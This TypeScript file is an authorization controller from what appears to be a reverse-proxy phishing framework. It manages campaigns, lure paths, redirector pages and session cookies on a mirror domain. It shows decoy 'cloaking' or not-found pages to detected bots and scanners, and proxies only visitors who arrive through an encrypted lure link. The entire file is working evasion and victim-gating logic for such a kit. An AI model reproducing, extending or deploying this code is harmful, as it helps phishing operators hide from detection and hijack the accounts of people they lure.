import { decrypt, DIContainer, encrypt, randomIdentSchema, randomName } from '@famir/common'
import { redirectorParamsSchema, upgradeSessionParamsSchema } from '@famir/database'
import {
  FullCampaignModel,
  FullRedirectorModel,
  HttpCookie,
  Logger,
  LOGGER,
  RedirectorParams,
  SessionModel,
  TEMPLATER,
  Templater,
  UpgradeSessionParams,
  Validator,
  VALIDATOR,
} from '@famir/domain'
import {
  HTTP_SERVER_ASSETS,
  HTTP_SERVER_ROUTER,
  type HttpServerAssets,
  type HttpServerContext,
  type HttpServerRouter,
} from '@famir/http-server'
import {
  BaseController,
  ReverseDispatchContextType,
  ReverseDispatchTargetAccessLevel,
  ReverseDispatchTargetLabel,
} from '../base/index.js'
import { AUTHORIZE_SERVICE, type AuthorizeService } from './authorize.service.js'

/**
 * DI token for the authorize controller.
 *
 * @category Authorize
 */
export const AUTHORIZE_CONTROLLER = Symbol('AuthorizeController')

/**
 * Represents the authorize controller.
 *
 * @category Authorize
 */
export class AuthorizeController extends BaseController {
  /**
   * Registers the controller as a singleton in the DI container.
   *
   * @param container - The DI container to register in.
   */
  static register(container: DIContainer) {
    container.registerSingleton<AuthorizeController>(
      AUTHORIZE_CONTROLLER,
      (c) =>
        new this(
          c.resolve<Validator>(VALIDATOR),
          c.resolve<Logger>(LOGGER),
          c.resolve<Templater>(TEMPLATER),
          c.resolve<HttpServerAssets>(HTTP_SERVER_ASSETS),
          c.resolve<HttpServerRouter>(HTTP_SERVER_ROUTER),
          c.resolve<AuthorizeService>(AUTHORIZE_SERVICE)
        )
    )
  }

  /**
   * Resolves the controller from the DI container.
   *
   * @param container - The DI container to resolve from.
   * @returns The controller instance.
   */
  static resolve(container: DIContainer) {
    return container.resolve<AuthorizeController>(AUTHORIZE_CONTROLLER)
  }

  /**
   * Creates a new controller instance.
   *
   * @param validator - The validator instance.
   * @param logger - The logger instance.
   * @param templater - The templater instance.
   * @param assets - The assets instance.
   * @param router - The router instance.
   * @param authorizeService - The authorize service instance.
   */
  constructor(
    validator: Validator,
    logger: Logger,
    templater: Templater,
    assets: HttpServerAssets,
    router: HttpServerRouter,
    protected readonly authorizeService: AuthorizeService
  ) {
    super(validator, logger, templater, assets, router)
  }

  init(): this {
    this.validator
      .addSchema('reverse-authorize-session-cookie', randomIdentSchema)
      .addSchema('reverse-authorize-upgrade-session-params', upgradeSessionParamsSchema)
      .addSchema('reverse-authorize-redirector-params', redirectorParamsSchema)

    return this
  }

  main(): this {
    this.router.add('authorize-main', async (ctx, next) => {
      await this.dispatchMain[ctx.type](ctx, next)
    })

    return this
  }

  hook(): this {
    this.router.add('authorize-hook', async (ctx, next) => {
      const target = this.getState(ctx, 'target')

      if (!target.label) {
        await next()

        return
      }

      const hook = this.dispatchHook[target.label]

      if (hook) {
        await hook(ctx, next)
      } else {
        this.logger.warn(`Controller dispatch hook not found`, {
          controller: 'authorize',
          targetLabel: target.label,
        })

        await next()
      }
    })

    return this
  }

  protected dispatchMain: ReverseDispatchContextType = {
    normal: async (ctx, next) => {
      const target = this.getState(ctx, 'target')

      await this.dispatchMainNormal[target.accessLevel](ctx, next)
    },

    websocket: async (ctx, next) => {
      const target = this.getState(ctx, 'target')

      await this.dispatchMainWebSocket[target.accessLevel](ctx, next)
    },
  }

  protected dispatchMainNormal: ReverseDispatchTargetAccessLevel = {
    transparent: async (ctx, next) => {
      const campaign = this.getState(ctx, 'campaign')
      const target = this.getState(ctx, 'target')

      if (!target.hasFlag('no-cloaking-site') && ctx.isBot) {
        await this.sendCloakingSite(ctx, target)

        return
      }

      let session: SessionModel | null = null

      const sessionCookie = this.getSessionCookie(ctx, campaign)
      if (this.checkSessionCookie(sessionCookie)) {
        session = await this.authorizeService.authSession({
          campaignId: campaign.campaignId,
          sessionId: sessionCookie,
        })
      }

      if (!session) {
        session = await this.authorizeService.createSession({
          campaignId: campaign.campaignId,
        })
      }

      this.persistSessionCookie(ctx, campaign, session)

      const proxy = await this.authorizeService.readProxy({
        campaignId: campaign.campaignId,
        proxyId: session.proxyId,
      })

      this.setState(ctx, 'proxy', proxy)
      this.setState(ctx, 'session', session)

      if (campaign.hasFlag('verbose')) {
        ctx.responseHeaders.merge({
          'X-Famir-Session-Id': session.sessionId,
          'X-Famir-Proxy-Id': proxy.proxyId,
        })
      }

      await next()
    },

    landing: async (ctx, next) => {
      const campaign = this.getState(ctx, 'campaign')
      const target = this.getState(ctx, 'target')

      if (ctx.url.isPath(campaign.upgradeSessionPath)) {
        if (!ctx.method.is('GET')) {
          await this.sendNotFoundPage(ctx, target)

          return
        }

        const upgradeSessionParams = this.parseUpgradeSessionParams(ctx, campaign)
        if (!upgradeSessionParams) {
          await this.sendNotFoundPage(ctx, target)

          return
        }

        if (ctx.isBot) {
          await this.sendNotFoundPage(ctx, target)

          return
        }

        const okey = await this.authorizeService.upgradeSession({
          campaignId: campaign.campaignId,
          lureId: upgradeSessionParams.lure_id,
          sessionId: upgradeSessionParams.session_id,
          secret: upgradeSessionParams.secret,
        })

        if (!okey) {
          await this.sendNotFoundPage(ctx, target)

          return
        }

        await this.sendRedirectTo(ctx, upgradeSessionParams.back_url)

        return
      }

      const lure = await this.authorizeService.findLure({
        campaignId: campaign.campaignId,
        path: ctx.url.get('pathname'),
      })

      if (lure) {
        if (!ctx.method.is(['GET', 'HEAD'])) {
          await this.sendNotFoundPage(ctx, target)

          return
        }

        const redirector = await this.authorizeService.readRedirector({
          campaignId: campaign.campaignId,
          redirectorId: lure.redirectorId,
        })

        const redirectorParams = this.parseRedirectorParams(ctx, campaign, redirector)
        if (!redirectorParams) {
          await this.sendNotFoundPage(ctx, target)

          return
        }

        if (ctx.isBot) {
          await this.sendRedirectorPage(ctx, target, redirector, {
            ...redirectorParams,
            upgrade_url: null,
          })

          return
        }

        const sessionCookie = this.getSessionCookie(ctx, campaign)
        if (!sessionCookie) {
          const session = await this.authorizeService.createSession({
            campaignId: campaign.campaignId,
          })

          this.persistSessionCookie(ctx, campaign, session)

          await this.sendOriginRedirect(ctx)

          return
        }

        if (!this.checkSessionCookie(sessionCookie)) {
          this.removeSessionCookie(ctx, campaign)

          await this.sendOriginRedirect(ctx)

          return
        }

        const session = await this.authorizeService.authSession({
          campaignId: campaign.campaignId,
          sessionId: sessionCookie,
        })

        if (!session) {
          this.removeSessionCookie(ctx, campaign)

          await this.sendOriginRedirect(ctx)

          return
        }

        this.persistSessionCookie(ctx, campaign, session)

        const upgradeSessionParams: UpgradeSessionParams = {
          lure_id: lure.lureId,
          session_id: session.sessionId,
          secret: session.secret,
          back_url: redirectorParams['back_url'] ?? '/',
        }

        const upgrade_url = [
          campaign.upgradeSessionPath,
          '?',
          randomName(),
          '=',
          encrypt(JSON.stringify(upgradeSessionParams), campaign.cryptSecret),
        ].join('')

        await this.sendRedirectorPage(ctx, target, redirector, {
          ...redirectorParams,
          upgrade_url,
        })

        return
      }

      if (!target.hasFlag('no-cloaking-site') && ctx.isBot) {
        await this.sendCloakingSite(ctx, target)

        return
      }

      const sessionCookie = this.getSessionCookie(ctx, campaign)
      if (!sessionCookie) {
        await this.sendCloakingSite(ctx, target)

        return
      }

      if (!this.checkSessionCookie(sessionCookie)) {
        this.removeSessionCookie(ctx, campaign)

        await this.sendOriginRedirect(ctx)

        return
      }

      const session = await this.authorizeService.authSession({
        campaignId: campaign.campaignId,
        sessionId: sessionCookie,
      })

      if (!session) {
        this.removeSessionCookie(ctx, campaign)

        await this.sendOriginRedirect(ctx)

        return
      }

      this.persistSessionCookie(ctx, campaign, session)

      if (!session.isUpgraded) {
        await this.sendCloakingSite(ctx, target)

        return
      }

      const proxy = await this.authorizeService.readProxy({
        campaignId: campaign.campaignId,
        proxyId: session.proxyId,
      })

      this.setState(ctx, 'proxy', proxy)
      this.setState(ctx, 'session', session)

      if (campaign.hasFlag('verbose')) {
        ctx.responseHeaders.merge({
          'X-Famir-Session-Id': session.sessionId,
          'X-Famir-Proxy-Id': proxy.proxyId,
        })
      }

      await next()
    },
  }

  protected dispatchMainWebSocket: ReverseDispatchTargetAccessLevel = {
    transparent: async (ctx, next) => {
      const campaign = this.getState(ctx, 'campaign')
      const target = this.getState(ctx, 'target')

      if (!target.hasFlag('no-cloaking-site') && ctx.isBot) {
        ctx.close()

        return
      }

      let session: SessionModel | null = null

      const sessionCookie = this.getSessionCookie(ctx, campaign)
      if (this.checkSessionCookie(sessionCookie)) {
        session = await this.authorizeService.authSession({
          campaignId: campaign.campaignId,
          sessionId: sessionCookie,
        })
      }

      if (!session) {
        session = await this.authorizeService.createSession({
          campaignId: campaign.campaignId,
        })
      }

      const proxy = await this.authorizeService.readProxy({
        campaignId: campaign.campaignId,
        proxyId: session.proxyId,
      })

      this.setState(ctx, 'proxy', proxy)
      this.setState(ctx, 'session', session)

      if (campaign.hasFlag('verbose')) {
        ctx.responseHeaders.merge({
          'X-Famir-Session-Id': session.sessionId,
          'X-Famir-Proxy-Id': proxy.proxyId,
        })
      }

      await next()
    },

    landing: async (ctx, next) => {
      const campaign = this.getState(ctx, 'campaign')
      const target = this.getState(ctx, 'target')

      if (!target.hasFlag('no-cloaking-site') && ctx.isBot) {
        ctx.close()

        return
      }

      const sessionCookie = this.getSessionCookie(ctx, campaign)
      if (!this.checkSessionCookie(sessionCookie)) {
        ctx.close()

        return
      }

      const session = await this.authorizeService.authSession({
        campaignId: campaign.campaignId,
        sessionId: sessionCookie,
      })

      if (!session || !session.isUpgraded) {
        ctx.close()

        return
      }

      const proxy = await this.authorizeService.readProxy({
        campaignId: campaign.campaignId,
        proxyId: session.proxyId,
      })

      this.setState(ctx, 'proxy', proxy)
      this.setState(ctx, 'session', session)

      if (campaign.hasFlag('verbose')) {
        ctx.responseHeaders.merge({
          'X-Famir-Session-Id': session.sessionId,
          'X-Famir-Proxy-Id': proxy.proxyId,
        })
      }

      await next()
    },
  }

  protected dispatchHook: ReverseDispatchTargetLabel = {}

  protected getSessionCookie(
    ctx: HttpServerContext,
    campaign: FullCampaignModel
  ): HttpCookie | undefined {
    const cookies = ctx.requestHeaders.getCookies()

    return cookies ? cookies[campaign.sessionCookieName] : undefined
  }

  protected checkSessionCookie(value: unknown): value is string {
    return this.validator.guardSchema<string>('reverse-authorize-session-cookie', value)
  }

  protected persistSessionCookie(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    session: SessionModel
  ) {
    ctx.sureNormal()

    const setCookies = ctx.responseHeaders.getSetCookies() ?? {}

    setCookies[campaign.sessionCookieName] = {
      value: session.sessionId,
      domain: '.' + campaign.mirrorDomain,
      path: '/',
      httpOnly: true,
      maxAge: Math.round(campaign.sessionExpire / 1000),
    }

    ctx.responseHeaders.setSetCookies(setCookies)
  }

  protected removeSessionCookie(ctx: HttpServerContext, campaign: FullCampaignModel) {
    ctx.sureNormal()

    const setCookies = ctx.responseHeaders.getSetCookies() ?? {}

    setCookies[campaign.sessionCookieName] = {
      value: '',
      domain: '.' + campaign.mirrorDomain,
      path: '/',
      httpOnly: true,
      maxAge: 0,
    }

    ctx.responseHeaders.setSetCookies(setCookies)
  }

  protected parseUpgradeSessionParams(
    ctx: HttpServerContext,
    campaign: FullCampaignModel
  ): UpgradeSessionParams | null {
    try {
      const urlParams = ctx.url.getQueryString()
      const value = Object.values(urlParams)[0]

      if (!(value && typeof value === 'string')) {
        return null
      }

      const data: unknown = JSON.parse(decrypt(value, campaign.cryptSecret))

      this.validator.assertSchema<UpgradeSessionParams>(
        'reverse-authorize-upgrade-session-params',
        data
      )

      return data
    } catch {
      return null
    }
  }

  protected parseRedirectorParams(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    redirector: FullRedirectorModel
  ): RedirectorParams | null {
    try {
      const urlParams = ctx.url.getQueryString()
      const value = Object.values(urlParams)[0]

      if (!(value && typeof value === 'string')) {
        return redirector.isLoose ? {} : null
      }

      const data: unknown = JSON.parse(decrypt(value, campaign.cryptSecret))

      this.validator.assertSchema<RedirectorParams>('reverse-authorize-redirector-params', data)

      return redirector.checkParams(data) ? data : null
    } catch {
      return null
    }
  }
}
